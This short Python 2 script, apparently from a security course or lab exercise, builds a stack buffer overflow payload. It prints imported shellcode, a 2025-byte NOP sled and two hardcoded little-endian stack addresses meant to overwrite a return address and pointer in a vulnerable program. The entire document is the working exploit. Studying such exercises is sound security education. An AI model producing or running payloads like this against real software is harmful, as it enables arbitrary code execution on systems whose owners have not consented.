from shellcode import shellcode
from struct import pack
print shellcode + '\x90' * 2025 + pack("<I", 0xbffeec58) + pack("<I", 0xbffef46c)
